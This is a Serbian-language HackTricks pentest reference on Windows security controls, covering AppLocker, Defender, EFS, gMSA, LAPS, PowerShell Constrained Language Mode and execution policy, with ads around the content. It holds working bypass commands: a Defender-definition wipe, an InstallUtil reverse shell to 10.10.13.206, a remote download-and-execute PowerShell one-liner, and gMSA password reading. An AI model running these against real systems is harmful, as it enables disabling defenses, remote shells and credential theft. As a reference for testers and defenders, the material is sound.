# Windows Security Controls

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da lako izgradite i **automatizujete radne tokove** uz pomoć najnaprednijih alata zajednice.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## AppLocker politika

Bela lista aplikacija je lista odobrenih softverskih aplikacija ili izvršnih datoteka koje smeju biti prisutne i pokrenute na sistemu. Cilj je zaštita okruženja od štetnog malvera i neodobrenog softvera koji se ne slaže sa specifičnim poslovnim potrebama organizacije.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) je Microsoft-ovo **rešenje za belu listu aplikacija** i omogućava sistemskim administratorima kontrolu nad **kojim aplikacijama i datotekama korisnici mogu pokrenuti**. Pruža **detaljnu kontrolu** nad izvršnim datotekama, skriptama, Windows instalacionim datotekama, DLL-ovima, pakovanim aplikacijama i instalaterima pakovanih aplikacija.\
Često je uobičajeno da organizacije **blokiraju cmd.exe i PowerShell.exe** i pristup određenim direktorijumima, **ali sve to može biti zaobiđeno**.

### Provera

Proverite koje datoteke/ekstenzije su na crnoj/beloj listi:
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Ova putanja registra sadrži konfiguracije i politike koje primenjuje AppLocker, pružajući način za pregled trenutnog skupa pravila koja se primenjuju na sistemu:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`


### Zaobilaženje

* Korisne **folderi za pisanje** za zaobilaženje AppLocker politike: Ako AppLocker dozvoljava izvršavanje bilo čega unutar `C:\Windows\System32` ili `C:\Windows`, postoje **folderi za pisanje** koje možete koristiti za **zaobilaženje ovoga**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
* Često **povereni** binarni fajlovi [**"LOLBAS-a"**](https://lolbas-project.github.io/) mogu biti korisni za zaobilaženje AppLocker-a.
* **Loše napisana pravila takođe mogu biti zaobiđena**.
* Na primer, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, možete kreirati **folder nazvan `allowed`** bilo gde i biće dozvoljen.
* Organizacije često fokusiraju na **blokiranje izvršnog fajla `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, ali zaboravljaju na **druge** [**lokacije izvršnih fajlova PowerShell-a**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) kao što su `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ili `PowerShell_ISE.exe`.
* **Veoma retko je omogućeno sprovođenje DLL-ova** zbog dodatnog opterećenja koje može staviti na sistem i količine testiranja potrebnog da se osigura da ništa neće biti oštećeno. Stoga, korišćenje DLL-ova kao tajnih prolaza će pomoći u zaobilaženju AppLocker-a.
* Možete koristiti [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) da **izvršite PowerShell** kod u bilo kom procesu i zaobiđete AppLocker. Za više informacija pogledajte: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Skladištenje akreditacija

### Security Accounts Manager (SAM)

Lokalne akreditacije se nalaze u ovom fajlu, lozinke su heširane.

### Lokalni Security Authority (LSA) - LSASS

**Akreditacije** (heširane) su **sačuvane** u **memoriji** ovog podsistema iz razloga jednostavnog prijavljivanja.\
LSA upravlja lokalnom **bezbednosnom politikom** (politika lozinke, dozvole korisnika...), **autentifikacijom**, **pristupnim tokenima**...\
LSA će biti ta koja će **proveriti** dostavljene akreditacije unutar SAM fajla (za lokalnu prijavu) i **komunicirati** sa kontrolerom domena da autentifikuje korisnika domena.

**Akreditacije** su **sačuvane** unutar procesa LSASS-a: Kerberos tiketi, NT i LM heševi, lako dešifrovane lozinke.

### LSA tajne

LSA može sačuvati neke akreditacije na disku:

* Lozinka računa računara Active Directory-ja (nedostupan kontroler domena).
* Lozinke naloga Windows servisa
* Lozinke za zakazane zadatke
* Više (lozinka IIS aplikacija...)

### NTDS.dit

To je baza podataka Active Directory-ja. Prisutna je samo na kontrolerima domena.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) je antivirus koji je dostupan u Windows 10 i Windows 11, kao i u verzijama Windows Server-a. On **blokira** uobičajene alate za pentestiranje kao što je **`WinPEAS`**. Međutim, postoje načini za **zaobilaženje ovih zaštita**.

### Provera

Da biste proverili **status** Defender-a, možete izvršiti PS cmdlet **`Get-MpComputerStatus`** (proverite vrednost **`RealTimeProtectionEnabled`** da biste znali da li je aktivno):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Da biste ga enumerisali, takođe možete pokrenuti:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Enkriptovani sistem datoteka (EFS)

EFS obezbeđuje sigurnost datoteka putem enkripcije, koristeći **simetrični ključ** poznat kao **Ključ za enkripciju datoteke (FEK)**. Ovaj ključ je enkriptovan korisnikovim **javni ključem** i čuva se unutar alternativnog podatkovnog toka $EFS enkriptovane datoteke. Kada je potrebno dekriptovanje, odgovarajući **privatni ključ** korisnikovog digitalnog sertifikata se koristi za dekriptovanje FEK iz $EFS toka. Više detalja možete pronaći [ovde](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Scenariji dekriptovanja bez inicijacije korisnika** uključuju:

- Kada se datoteke ili fascikle premeste na ne-EFS fajl sistem, kao što je [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), automatski se dekriptuju.
- Enkriptovane datoteke poslate preko mreže putem SMB/CIFS protokola se dekriptuju pre slanja.

Ovaj metod enkripcije omogućava **transparentan pristup** enkriptovanim datotekama vlasniku. Međutim, jednostavna promena lozinke vlasnika i prijava neće omogućiti dekriptovanje.

**Ključne tačke**:
- EFS koristi simetrični FEK, enkriptovan korisnikovim javnim ključem.
- Dekriptovanje koristi korisnikov privatni ključ za pristup FEK-u.
- Automatsko dekriptovanje se javlja pod određenim uslovima, kao što je kopiranje na FAT32 ili mrežno slanje.
- Enkriptovane datoteke su dostupne vlasniku bez dodatnih koraka.

### Provera informacija o EFS-u

Proverite da li **korisnik** je **koristio** ovu **uslugu** proverom da li putanja postoji: `C:\users\<korisničko_ime>\appdata\roaming\Microsoft\Protect`

Proverite **ko** ima **pristup** datoteci korišćenjem cipher /c \<datoteka>\
Takođe možete koristiti `cipher /e` i `cipher /d` unutar fascikle za **enkripciju** i **dekripciju** svih datoteka

### Dekriptovanje EFS datoteka

#### Kao sistem sa ovlašćenjem

Ovaj način zahteva da je **korisnik žrtva** pokrenuo **proces** unutar hosta. Ako je to slučaj, koristeći `meterpreter` sesije, možete preuzeti token procesa korisnika (`impersonate_token` iz `incognito`). Ili jednostavno možete `migrate` na proces korisnika.

#### Poznavanje lozinke korisnika

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## Grupisani upravljani servisni nalozi (gMSA)

Microsoft je razvio **Grupisane upravljane servisne naloge (gMSA)** kako bi pojednostavio upravljanje servisnim nalozima u IT infrastrukturama. Za razliku od tradicionalnih servisnih naloga koji često imaju omogućenu opciju "**Lozinka nikada ne ističe**", gMSA pružaju sigurnije i upravljivije rešenje:

- **Automatsko upravljanje lozinkom**: gMSA koriste složenu lozinku od 240 karaktera koja se automatski menja prema politici domena ili računara. Ovaj proces obavlja Microsoft-ov Key Distribution Service (KDC), eliminišući potrebu za ručnim ažuriranjem lozinke.
- **Poboljšana sigurnost**: Ovi nalozi su imuni na zaključavanje i ne mogu se koristiti za interaktivne prijave, čime se poboljšava njihova sigurnost.
- **Podrška za više hostova**: gMSA se mogu deliti između više hostova, što ih čini idealnim za servise koji se pokreću na više servera.
- **Mogućnost zakazanih zadataka**: Za razliku od upravljanih servisnih naloga, gMSA podržavaju pokretanje zakazanih zadataka.
- **Pojeftinjeno upravljanje SPN-ovima**: Sistem automatski ažurira Service Principal Name (SPN) kada dođe do promena u sAMaccount detaljima računara ili DNS imenu, pojednostavljujući upravljanje SPN-ovima.

Lozinke za gMSA se čuvaju u LDAP svojstvu _**msDS-ManagedPassword**_ i automatski se resetuju svakih 30 dana od strane kontrolera domena (DC). Ova lozinka, enkriptovani podaci poznati kao [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), mogu se dobiti samo od ovlašćenih administratora i servera na kojima su instalirani gMSA, obezbeđujući sigurno okruženje. Za pristup ovim informacijama potrebna je bezbedna veza poput LDAPS-a ili veza mora biti autentifikovana sa 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../.gitbook/assets/asd1.png)

Možete pročitati ovu lozinku pomoću [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
**[Pronađi više informacija u ovom postu](https://cube0x0.github.io/Relaying-for-gMSA/)**

Takođe, proverite ovu [web stranicu](https://cube0x0.github.io/Relaying-for-gMSA/) o tome kako izvesti **NTLM relay napad** da biste **pročitali** **lozinku** gMSA.

## LAPS

**Local Administrator Password Solution (LAPS)**, dostupan za preuzimanje sa [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), omogućava upravljanje lokalnim administratorskim lozinkama. Ove lozinke, koje su **slučajno generisane**, jedinstvene i **redovno menjane**, se centralno čuvaju u Active Directory-ju. Pristup ovim lozinkama je ograničen putem ACL-ova za ovlašćene korisnike. Sa dovoljnim dozvolama, omogućeno je čitanje lokalnih administratorskih lozinki.

{% content-ref url="active-directory-methodology/laps.md" %}
[laps.md](active-directory-methodology/laps.md)
{% endcontent-ref %}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **zaključava mnoge od funkcionalnosti** potrebnih za efikasno korišćenje PowerShell-a, kao što je blokiranje COM objekata, dozvoljavanje samo odobrenih .NET tipova, XAML baziranih radnih tokova, PowerShell klasa i još mnogo toga.

### **Provera**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Zaobilazak

Bypass je tehnika koja omogućava zaobilaženje sigurnosnih mehanizama kako bi se stekao neovlašćen pristup sistemima ili podacima. U nastavku su opisane neke tehnike za zaobilazak autentifikacije, kontrola korisničkog naloga (UAC) i sistema za šifrovanje datoteka (EFS).
```powershell
#Easy bypass
Powershell -version 2
```
U trenutnoj verziji Windowsa taj Bypass neće raditi, ali možete koristiti [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Da biste ga kompajlirali, možda će vam biti potrebno** **dodati referencu** -> _Pretraži_ -> _Pretraži_ -> dodaj `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` i **promenite projekat na .Net4.5**.

#### Direktni Bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:

#### Reversni shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Možete koristiti [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) da biste **izvršili Powershell** kod u bilo kojem procesu i zaobišli ograničeni režim. Za više informacija pogledajte: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## PS Izvršna politika

Prema zadanim postavkama postavljena je na **restricted**. Glavni načini zaobilaženja ove politike su:
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Više informacija može se pronaći [ovde](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Security Support Provider Interface (SSPI)

SSPI je API koji se može koristiti za autentifikaciju korisnika.

SSPI je zadužen za pronalaženje odgovarajućeg protokola za komunikaciju između dve mašine. Preferirana metoda za to je Kerberos. Zatim SSPI pregovara o tome koji će autentifikacioni protokol biti korišćen. Ovi autentifikacioni protokoli se nazivaju Security Support Provider (SSP) i nalaze se unutar svake Windows mašine u obliku DLL fajlova. Obe mašine moraju podržavati isti protokol kako bi mogle da komuniciraju.

### Glavni SSP-ovi

* **Kerberos**: Preferirani
* %windir%\Windows\System32\kerberos.dll
* **NTLMv1** i **NTLMv2**: Iz razloga kompatibilnosti
* %windir%\Windows\System32\msv1\_0.dll
* **Digest**: Web serveri i LDAP, lozinka u obliku MD5 heša
* %windir%\Windows\System32\Wdigest.dll
* **Schannel**: SSL i TLS
* %windir%\Windows\System32\Schannel.dll
* **Negotiate**: Koristi se za pregovaranje o protokolu koji će biti korišćen (Kerberos ili NTLM, pri čemu je Kerberos podrazumevani)
* %windir%\Windows\System32\lsasrv.dll

#### Pregovaranje može ponuditi više metoda ili samo jednu.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) je funkcija koja omogućava **zahtev za odobrenje za privilegovane aktivnosti**.

{% content-ref url="windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da jednostavno izgradite i **automatizujete radne tokove** uz pomoć najnaprednijih alata zajednice.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

***

<details>

<summary><strong>Naučite hakovanje AWS-a od početnika do stručnjaka sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **oglašavanje vaše kompanije u HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, pogledajte [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
